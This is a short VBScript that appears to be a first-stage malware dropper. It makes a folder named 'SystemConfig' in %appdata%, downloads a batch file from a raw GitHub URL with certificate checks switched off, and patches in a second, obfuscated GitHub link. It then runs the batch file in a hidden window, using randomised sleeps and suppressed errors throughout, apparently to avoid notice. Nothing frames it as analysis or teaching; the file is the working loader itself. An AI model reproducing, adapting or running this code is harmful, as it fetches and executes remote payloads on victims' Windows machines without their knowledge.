On Error Resume Next

Const configPath = "%appdata%\SystemConfig"
Const taskFile = "%appdata%\SystemConfig\task_schedule.bat"
Const updateSource = "https://raw.githubusercontent.com/Khanzadaofficial/newss/main/main.txt"
Const token = "****"
Const newLink = "https:$$raw.githubusercontent.com$lospolloshermanos0000019$files$refs$heads$main$encoded_new.txt"

Set sysFS = CreateObject("Scripting.FileSystemObject")
Set sysShell = CreateObject("WScript.Shell")

If Not sysFS.FolderExists(sysShell.ExpandEnvironmentStrings(configPath)) Then
    sysFS.CreateFolder sysShell.ExpandEnvironmentStrings(configPath)
    WScript.Sleep Int((Rnd * 2000) + 1000)
End If

Set netReq = CreateObject("MSXML2.ServerXMLHTTP")
netReq.Open "GET", updateSource, False
netReq.setOption 2, 13056 ' Ignore SSL errors
netReq.Send
If netReq.Status = 200 Then
    Set stream = CreateObject("ADODB.Stream")
    stream.Open
    stream.Type = 1
    stream.Write netReq.ResponseBody
    stream.SaveToFile sysShell.ExpandEnvironmentStrings(taskFile), 2
    stream.Close
    WScript.Sleep Int((Rnd * 3000) + 1500)
Else
    WScript.Quit
End If

If sysFS.FileExists(sysShell.ExpandEnvironmentStrings(taskFile)) Then
    Set configFile = sysFS.OpenTextFile(sysShell.ExpandEnvironmentStrings(taskFile), 1)
    configData = configFile.ReadAll
    configFile.Close
    Set configFile = sysFS.OpenTextFile(sysShell.ExpandEnvironmentStrings(taskFile), 2)
    configFile.Write Replace(configData, token, newLink)
    configFile.Close
    WScript.Sleep Int((Rnd * 2500) + 1000)
Else
    WScript.Quit
End If

sysShell.Run "cmd /c timeout /t " & Int((Rnd * 3) + 2) & " & """ & sysShell.ExpandEnvironmentStrings(taskFile) & """", 0, False
WScript.Sleep Int((Rnd * 2000) + 1000)
